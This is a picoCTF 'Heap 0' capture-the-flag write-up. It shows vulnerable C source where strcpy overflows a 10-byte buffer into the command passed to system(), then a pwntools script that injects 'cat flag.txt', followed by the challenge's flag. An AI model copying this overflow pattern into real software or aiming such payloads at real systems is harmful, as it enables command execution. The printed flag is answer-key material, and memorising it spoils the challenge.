# Heap 0

### Information
* Category: Pwn
* Point:
* Level: Easy

### Description
A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?

Additional details will be available after launching your challenge instance.

Connect to server via `$ nc amiable-citadel.picoctf.net <PORT>`

### Hint
- Look closely at how the program stores and uses your input.

### Solution

#### What we got?
- The problem gives us the src code of the server:
    ```c
    #include <string.h>
    #include <stdio.h>
    #include <stdlib.h> 

    void fun(char *name, char *cmd);

    int main() {
        char name[200];
        printf("What is your name?\n");
        fflush(stdout);


        fgets(name, sizeof(name), stdin);
        name[strcspn(name, "\n")] = 0;

        fun(name, "uname");
        return 0;
    }

    void fun(char *name, char *cmd) {
        char c[10];
        char buffer[10];

        strcpy(c, cmd);
        strcpy(buffer, name);

        printf("Goodbye, %s!\n", buffer);
        fflush(stdout);
        system(c);
    }
    ```

    - The code asks the user for their name, stores up to 199 bytes of input in `name`, removes the trailing newline, and then calls `fun(name, "uname")`. Inside `fun`, two small 10‑byte arrays—`c` and `buffer`—are created on the stack, and `"uname"` is copied into `c`. Then the user‑supplied `name` is copied into `buffer` using `strcpy`, which blindly copies all bytes until a null terminator. The program prints “Goodbye, <name>!” using the content of `buffer`, and finally executes the command stored in `c` via `system(c)`. Because `buffer` is smaller than the input allowed for `name`, copying `name` into `buffer` can overflow into `c` and change the command that gets executed, which is the root of the program’s vulnerability.


#### How to get the flag ?
- Base on the explanation, we see that the size of buffer is only 10, however, name's size is 200. So our method can be buffer overflow to exploit to get flag.

    ```python
    from pwn import *

    HOST = "amiable-citadel.picoctf.net"
    PORT = 50945

    p = remote(HOST, PORT)
    p.recvuntil(b"name?")
    p.recvline()

    name = b"a"*10 + b"cat flag.txt\n" # Injection happens here
    p.sendline(name) 

    byeline = p.recvline()
    flag = p.recvline()
    print(flag)
    ```
- The flag is `picoCTF{0v3rfl0w_c0mm4nd_22530a1b}`
